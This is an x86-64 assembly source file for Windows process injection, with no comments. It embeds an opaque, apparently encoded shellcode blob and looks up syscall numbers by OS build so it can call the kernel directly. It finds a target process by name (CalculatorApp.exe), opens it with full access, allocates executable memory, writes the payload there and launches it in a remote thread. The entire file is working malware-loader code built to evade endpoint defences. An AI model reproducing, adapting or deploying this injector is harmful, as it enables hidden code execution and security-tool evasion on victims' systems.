section .data
shellcode db 049h, 0b8h, 0c1h, 0e6h, 042h, 014h, 0e1h, 081h, 076h, 08dh
db 054h, 05eh, 066h, 081h, 0e6h, 020h, 0f7h, 048h, 031h, 0dbh
db 0dbh, 0c9h, 048h, 00fh, 0aeh, 006h, 0b3h, 07eh, 048h, 08bh
db 07eh, 008h, 048h, 0ffh, 0cbh, 04ch, 031h, 044h, 0dfh, 019h
db 048h, 085h, 0dbh, 075h, 0f3h, 089h, 06fh, 0a3h, 05ch, 0d0h
db 07eh, 0adh, 043h, 0a7h, 067h, 0a3h, 094h, 01bh, 0c9h, 079h
db 023h, 0c0h, 0afh, 0ffh, 04fh, 061h, 000h, 0cbh, 09eh, 0ebh
db 0d8h, 05dh, 054h, 056h, 0f9h, 03eh, 006h, 090h, 0eeh, 00ah
db 0ebh, 02eh, 0cdh, 047h, 0e1h, 03bh, 0cfh, 00ah, 091h, 01eh
db 0f4h, 085h, 09fh, 0c8h, 085h, 0b7h, 036h, 019h, 064h, 0bdh
db 064h, 033h, 001h, 0beh, 086h, 029h, 0dfh, 091h, 09fh, 04eh
db 0c9h, 0fdh, 04fh, 072h, 0afh, 067h, 025h, 055h, 048h, 06fh
db 061h, 06dh, 0f2h, 0e2h, 094h, 049h, 02fh, 000h, 0cdh, 082h
db 08eh, 025h, 006h, 068h, 02fh, 07ah, 0d5h, 0beh, 04ch, 02dh
db 002h, 07fh, 03eh, 0e1h, 045h, 0ech, 040h, 01fh, 099h, 033h
db 092h, 090h, 06bh, 0e4h, 0a6h, 03ah, 072h, 03fh, 05fh, 077h
db 05bh, 093h, 00ah, 030h, 0d7h, 01ch, 072h, 091h, 025h, 0c1h
db 050h, 0f2h, 0a1h, 0bah, 03ah, 02fh, 05dh, 0e3h, 028h, 005h
db 00fh, 09dh, 03eh, 055h, 045h, 0d8h, 0eah, 072h, 043h, 0c0h
db 00bh, 02fh, 082h, 065h, 043h, 080h, 0d3h, 021h, 085h, 0b9h
db 06fh, 077h, 030h, 00fh, 014h, 01ah, 0ffh, 08eh, 013h, 09ch
db 0a4h, 03ah, 032h, 088h, 039h, 03bh, 0d0h, 0f3h, 002h, 072h
db 08dh, 0f0h, 012h, 046h, 00fh, 06fh, 022h, 072h, 0f7h, 0c0h
db 02ah, 084h, 0b2h, 0bch, 00bh, 0a0h, 019h, 006h, 0a7h, 00bh
db 047h, 0a1h, 0f2h, 0ceh, 005h, 05ch, 0f8h, 01bh, 0d9h, 0ebh
db 051h, 013h, 0d6h, 020h, 02dh, 04dh, 054h, 08ah, 063h, 094h
db 00eh, 058h, 0a2h, 04ah, 0b2h, 006h, 0dfh, 0bch, 0b9h, 010h
db 029h, 073h, 096h, 054h, 0fbh, 0bch, 0c3h, 000h, 010h, 0b1h
db 09eh, 09eh, 007h, 0ffh, 048h, 0a5h, 07ch, 0d4h, 08ch, 0c9h
db 06bh, 054h, 0c1h, 0bah, 0e6h, 0adh, 09fh, 010h, 071h, 06ah
db 005h, 070h, 07fh, 0a9h, 0bdh, 0cbh, 0a2h, 0b8h, 06fh, 045h
db 074h, 0eah, 095h, 0a7h, 0a2h, 048h, 00ch, 00ah, 00dh, 01dh
db 03eh, 08eh, 0a2h, 032h, 02ch, 033h, 0cfh, 006h, 043h, 0e8h
db 038h, 004h, 0e1h, 0e1h, 058h, 0fah, 00bh, 02ah, 08dh, 0b5h
db 059h, 07fh, 009h, 0ach, 043h, 05ah, 00eh, 091h, 041h, 0a6h
db 00ah, 09ah, 043h, 0e0h, 08eh, 0ech, 041h, 0a6h, 00ah, 0dah
db 046h, 05ah, 015h, 0bch, 006h, 09ah, 012h, 0b0h, 043h, 0e0h
db 0aeh, 0a4h, 041h, 01ch, 098h, 056h, 037h, 00ah, 0a0h, 0f6h
db 025h, 00dh, 019h, 03bh, 0c2h, 066h, 09dh, 0f5h, 0c8h, 0cfh
db 0b5h, 0a8h, 04ah, 03ah, 094h, 07fh, 05bh, 00dh, 0d3h, 0b8h
db 037h, 023h, 0ddh, 024h, 06fh, 0ach, 020h, 0e2h, 000h, 069h
db 0d3h, 071h, 07bh, 02dh, 058h, 0fah, 080h, 0ebh, 054h, 0f4h
db 009h, 02dh, 010h, 07fh, 0cbh, 01fh, 0bbh, 0bch, 008h, 0fdh
db 0d3h, 0b2h, 013h, 02fh, 057h, 0b4h, 029h, 064h, 059h, 02ah
db 05bh, 088h, 08ah, 0bch, 0f6h, 0e4h, 019h, 071h, 03fh, 0e3h
db 094h, 0f5h, 0dfh, 060h, 069h, 033h, 043h, 05ah, 01ch, 0b5h
db 0c8h, 0e4h, 055h, 056h, 04ah, 06ah, 01dh, 0cch, 0e9h, 058h
db 0a9h, 0b6h, 008h, 027h, 0f8h, 0fch, 04ch, 014h, 089h, 08fh
db 0d3h, 033h, 098h, 07fh, 049h, 009h, 011h, 0fbh, 0dbh, 00dh
db 09dh, 07fh, 005h, 065h, 01ch, 071h, 04bh, 077h, 095h, 0f5h
db 0d9h, 06ch, 0d3h, 0feh, 083h, 023h, 0ddh, 024h, 048h, 075h
db 019h, 0a2h, 055h, 032h, 086h, 0b5h, 051h, 06ch, 001h, 0bbh
db 051h, 023h, 05fh, 018h, 029h, 06ch, 00ah, 005h, 0ebh, 033h
db 09dh, 0adh, 053h, 065h, 0d3h, 0e8h, 0e2h, 020h, 023h, 00bh
db 0f6h, 070h, 010h, 0cbh, 0d0h, 038h, 095h, 04ah, 07eh, 044h
db 036h, 093h, 065h, 00eh, 0a8h, 0f4h, 048h, 07bh, 010h, 073h
db 0eah, 022h, 01bh, 036h, 045h, 05ah, 07eh, 0fdh, 0f4h, 0beh
db 08fh, 0a7h, 0e1h, 05ah, 058h, 0fah, 00bh, 026h, 0b3h, 08eh
db 060h, 041h, 034h, 09bh, 024h, 05eh, 0f2h, 0c4h, 029h, 005h
db 015h, 09bh, 068h, 002h, 0b2h, 080h, 066h, 05eh, 030h, 0c1h
db 02bh, 022h, 0b2h, 080h, 06ch, 041h, 078h, 0b7h, 06ah, 008h
db 0fch, 0bbh, 05ah, 00dh, 000h, 0dah, 03ah, 05fh, 083h, 0c3h
db 056h, 01fh, 071h, 0dah, 04ah, 01bh, 0ach, 098h, 06ch, 07ah
db 03dh, 098h, 040h, 002h, 0a8h, 0dbh, 03fh, 01dh, 06dh, 0d4h
db 03ah, 045h, 0edh, 0c1h, 029h, 005h, 013h, 0b2h, 05fh, 026h
db 090h, 0d8h, 029h, 041h, 031h, 091h, 06eh, 04bh, 09bh, 091h
db 06ah, 046h, 037h, 0d3h, 02bh, 03dh, 0b9h, 086h, 07ah, 044h
db 037h, 094h, 024h, 05ah, 0ebh, 0dah, 03dh, 003h, 069h, 0dah
db 058h, 00ah, 0bah, 095h, 07bh, 044h, 077h, 0cch, 03bh, 05eh
db 0f2h, 0c5h, 027h, 01ch, 06dh, 0fah, 052h, 038h, 086h, 0b9h
db 038h, 0edh, 015h, 0cbh, 0c2h, 038h, 08fh, 0bdh, 0b3h, 017h
db 00eh, 083h, 0ach, 06bh, 0dch, 0f4h, 009h, 0d2h, 08dh, 012h
db 000h, 06bh, 0dch, 0f4h, 038h, 01dh, 076h, 0cah, 025h, 05bh
db 0f2h, 0c5h, 03bh, 015h, 058h, 0a0h, 043h, 0e2h, 01dh, 0bdh
db 0ceh, 0edh, 0a3h, 0dah, 00bh, 06bh, 091h, 0c5h, 0c0h, 07eh
db 00bh, 090h, 008h, 038h, 095h, 04eh, 05eh, 0a4h, 0c7h, 03ch
db 00bh, 06bh, 0dch, 0f4h, 0f6h, 0f8h, 0b0h, 0d5h, 00bh, 06bh
db 0dch, 0dbh, 05eh, 048h, 01dh, 082h, 066h, 027h, 0b0h, 0c4h
db 038h, 059h, 01fh, 080h, 07dh, 05ch, 097h, 0cdh, 03bh, 014h
db 02bh, 09bh, 069h, 01ch, 0b3h, 092h, 062h, 048h, 068h, 0ach
db 05dh, 03fh, 0bbh, 0c6h, 05bh, 04eh, 00ah, 091h, 073h, 00eh
db 0a8h, 0b5h, 045h, 064h, 061h, 0aeh, 040h, 06bh, 094h, 07dh
db 0c8h, 07eh, 002h, 0bbh, 053h, 026h, 0edh, 03dh, 05ah, 065h
db 0e0h, 0fah, 039h, 0c3h, 058h, 0f4h, 009h, 02dh, 058h, 0aah
db 058h, 038h, 095h, 033h, 0cbh, 0c6h, 00dh, 0d4h, 030h, 094h
db 009h, 0bch, 080h, 0ebh, 032h, 0f0h, 054h, 023h, 055h, 005h
db 063h, 032h, 002h, 0a8h, 063h, 0ebh, 0efh, 0f4h, 009h, 064h
db 0d1h, 01ah, 061h, 06fh, 09dh, 0adh, 040h, 097h, 02dh, 0bch
db 095h, 0edh, 0dch, 0f4h, 009h, 02dh, 0a7h, 02fh, 046h, 05ah
db 01ch, 0a7h, 053h, 065h, 0d1h, 00bh, 046h, 05ah, 015h, 0b9h
db 038h, 0e4h, 00bh, 0a9h, 042h, 0ach, 01eh, 0d9h, 00fh, 035h
db 023h, 005h, 0deh, 0eeh, 01ch, 081h, 016h, 065h, 09fh, 03bh
db 083h, 078h, 0dch, 0f4h, 040h, 097h, 01ch, 00ah, 03eh, 08bh
db 0dch, 0f4h, 009h, 02dh, 0a7h, 02fh, 043h, 094h, 013h, 080h
db 00bh, 0c6h, 0f2h, 012h, 05eh, 06bh, 0dch, 0f4h, 05ah, 074h
db 032h, 0bah, 051h, 022h, 055h, 025h, 0c8h, 0cfh, 048h, 0b3h
db 0cch, 0abh, 0dch, 0e4h, 009h, 02dh, 011h, 040h, 053h, 0cfh
db 08fh, 011h, 009h, 02dh, 058h, 0fah, 0f4h, 0beh, 094h, 067h
db 05ah, 07eh, 010h, 073h, 0ech, 023h, 055h, 005h, 041h, 0a4h
db 082h, 0b3h, 0cch, 0abh, 0dch, 0d4h, 009h, 02dh, 011h, 073h
db 0f2h, 022h, 066h, 0e6h, 09fh, 0a4h, 0bah, 0fah, 00bh, 06bh
db 0dch, 00bh, 0dch, 065h, 0dbh, 03eh, 02bh, 0eeh, 01ch, 080h
db 0bbh, 04bh, 0d3h, 0fdh, 043h, 06ah, 01fh, 071h, 0c9h, 058h
db 08ah, 0a2h, 0c8h, 033h, 0b6h, 0f4h, 050h, 064h, 09fh, 038h
db 0fbh, 0deh, 07eh, 0a2h, 0f6h, 0f8h, 07fh, 0fah, 0c3h, 020h
db 09dh, 02eh, 01ch
global _start
section .text
_start:
push rbp
mov rbp, rsp
sub rsp, 0x500
jmp Begin
m_10240:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b3
cmovz rdi, rbx
ret
m_10586:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b4
cmovz rdi, rbx
ret
m_14393:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b6
cmovz rdi, rbx
ret
m_15063:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00b9
cmovz rdi, rbx
ret
m_16299:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00ba
cmovz rdi, rbx
ret
m_17134:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bb
cmovz rdi, rbx
ret
m_17763:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bc
cmovz rdi, rbx
ret
m_18362:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bd
cmovz rdi, rbx
ret
m_18363:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00bd
cmovz rdi, rbx
ret
m_19041:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c1
cmovz rdi, rbx
ret
m_19042:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c1
cmovz rdi, rbx
ret
m_19043:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c1
cmovz rdi, rbx
ret
m_19044:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c2
cmovz rdi, rbx
ret
m_19045:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c2
cmovz rdi, rbx
ret
m_22000:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c5
cmovz rdi, rbx
ret
m_20348:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c6
cmovz rdi, rbx
ret
m_22621:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c7
cmovz rdi, rbx
ret
m_22631:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c7
cmovz rdi, rbx
ret
m_25398:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c8
cmovz rdi, rbx
ret
m_26100:
cmp rdi, 0x1d
mov rbx, 0x0018
cmovz rdi, rbx
cmp rdi, 0x150
mov rbx, 0x0036
cmovz rdi, rbx
cmp rdi, 0x100
mov rbx, 0x0026
cmovz rdi, rbx
cmp rdi, 0x1f9
mov rbx, 0x003a
cmovz rdi, rbx
cmp rdi, 0x80
mov rbx, 0x00c9
cmovz rdi, rbx
ret
GetSysModelNumber:
mov rax, gs:[0x60]
mov rax, [rax+0x120]
and rax, 0xffff
cmp eax, 10240
je m_10240
cmp eax, 10586
je m_10586
cmp eax, 14393
je m_14393
cmp eax, 15063
je m_15063
cmp eax, 16299
je m_16299
cmp eax, 17134
je m_17134
cmp eax, 17763
je m_17763
cmp eax, 18362
je m_18362
cmp eax, 18363
je m_18363
cmp eax, 19041
je m_19041
cmp eax, 19042
je m_19042
cmp eax, 19043
je m_19043
cmp eax, 19044
je m_19044
cmp eax, 19045
je m_19045
cmp eax, 22000
je m_22000
cmp eax, 20348
je m_20348
cmp eax, 22621
je m_22621
cmp eax, 22631
je m_22631
cmp eax, 25398
je m_25398
cmp eax, 26100
je m_26100
ret
invokeSysCall:
syscall
ret
Begin:
mov qword [rbp-0x4], 0x0
mov word [rbp-0xc], 0x0
mov word [rbp-0xe], 0x0
mov qword [rbp-0x10], 0x0
mov qword [rbp-0x18], 0x0
mov qword [rbp-0x20], 0x0
mov word [rbp-0x28], 0x0
mov word [rbp-0x2a], 0x0
mov dword [rbp-0x2c], 0x0
mov dword [rbp-0x30], 0x0
mov dword [rbp-0x34], 0x0
mov dword [rbp-0x38], 0x0
mov qword [rbp-0x3c], 0x0
mov dword [rbp-0x44], 0x0
mov qword [rbp-0x10], 0x0
mov word [rbp-0x44], 0x1c
mov qword [rbp-0x48], 0x0
mov qword [rbp-0x50], 0x0
mov qword [rbp-0x58], 0x2000
mov qword [rbp-0x60], 0x0
mov qword [rbp-0x68], 0x0
mov qword [rbp-0x70], 0x0
mov qword [rbp-0x78], 0x0
mov qword [rbp-0x80], 0x5
mov qword [rbp-0x88], 0x0
mov qword [rbp-0x90], 0x0
mov qword [rbp-0x98], 0x0
mov qword [rbp-0xa0], 0x0
lea rax, [rel shellcode]
mov qword [rbp-0xa8], rax
loopStart_fxR:
NtAllocateVirtualMemory:
mov rcx, -1
lea rbx, qword [rbp-0x48]
mov rdx, rbx
mov r8, qword [rbp-0x68]
lea rbx, qword [rbp-0x58]
mov r9, rbx
push 0x4
push 0x3000
sub rsp, 0x20
mov rdi, 0x1d
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x38
NtQuerySystemInformation:
mov rcx, qword [rbp-0x80]
mov rdx, qword [rbp-0x48]
mov r8, qword [rbp-0x58]
lea rbx, qword [rbp-0x70]
mov r9, rbx
sub rsp, 0x20
mov rdi, 0x150
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
mov qword [rbp-0x78], rax
add rsp, 0x30
mov rax, qword [rbp-0x78]
cmp rax, 0x0
je loopEnd_Ciz
add qword [rbp-0x70], 0x2000
mov rbx, qword [rbp-0x70]
mov qword [rbp-0x58], rbx
mov qword [rbp-0x48], 0x0
jmp loopStart_fxR
loopEnd_Ciz:
mov rbx, qword [rbp-0x48]
mov qword [rbp-0x98], rbx
loopStart_meY:
mov rbx, qword [rbp-0x98]
mov ebx, dword [rbx]
mov qword [rbp-0x88], rbx
mov rax, qword [rbp-0x88]
cmp rax, 0x0
je loopEnd_dNh
mov rbx, qword [rbp-0x88]
add qword [rbp-0x98], rbx
mov rbx, qword [rbp-0x98]
mov rbx, qword [rbx+0x40]
mov qword [rbp-0x90], rbx
sub rsp, 0x28
mov rax, 0x0063006c00610043
mov qword [rsp], rax
mov rax, 0x00740061006c0075
mov qword [rsp+8], rax
mov rax, 0x007000410072006f
mov qword [rsp+16], rax
mov rax, 0x00780065002e0070
mov qword [rsp+24], rax
mov rax, 0x0000000000000065
mov qword [rsp+32], rax
mov rbx, rsp
mov qword [rbp-0x4], rbx
mov word [rbp-0xe], 0x22
mov rdi, qword [rbp-0x90]
mov rsi, qword [rbp-0x4]
mov rcx, 0x22
cld
repe cmpsb
mov rbx, qword [rbp-0x98]
mov rbx, qword [rbx+0x50]
mov qword [rbp-0xa0], rbx
je loopEnd_dNh
jmp loopStart_meY
loopEnd_dNh:
mov qword [rbp-0xd8], 0x0
mov qword [rbp-0xe0], 0x0
mov qword [rbp-0xe8], 0x0
mov rbx, qword [rbp-0xa0]
mov qword [rbp-0xe8], rbx
NtOpenProcess:
lea rbx, qword [rbp-0xd8]
mov rcx, rbx
mov rdx, 0x1fffff
lea rbx, qword [rbp-0x44]
mov r8, rbx
lea rbx, qword [rbp-0xe8]
mov r9, rbx
sub rsp, 0x20
mov rdi, 0x100
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x30
mov qword [rbp-0x48], 0x0
NtAllocateVirtualMemory1:
mov rcx, qword [rbp-0xd8]
lea rbx, qword [rbp-0x48]
mov rdx, rbx
mov r8, qword [rbp-0x68]
lea rbx, qword [rbp-0x58]
mov r9, rbx
push 0x40
push 0x3000
sub rsp, 0x20
mov rdi, 0x1d
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x38
mov qword [rbp-0xf8], 0x41d
NtWriteVirtualMemory:
mov rcx, qword [rbp-0xd8]
mov rdx, qword [rbp-0x48]
mov r8, qword [rbp-0xa8]
mov r9, qword [rbp-0xf8]
lea rbx, qword [rbp-0x50]
push rbx
sub rsp, 0x20
mov rdi, 0x1f9
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x34
mov qword [rbp-0x100], 0x0
NtCreateThreadEx:
lea rbx, qword [rbp-0x100]
mov rcx, rbx
mov rdx, 0x1fffff
mov r8, 0x0
mov r9, qword [rbp-0xd8]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push qword [rbp-0x48]
sub rsp, 0x20
mov rdi, 0x80
call GetSysModelNumber
mov r10, rcx
mov rax, rdi
call invokeSysCall
add rsp, 0x4c
leave
ret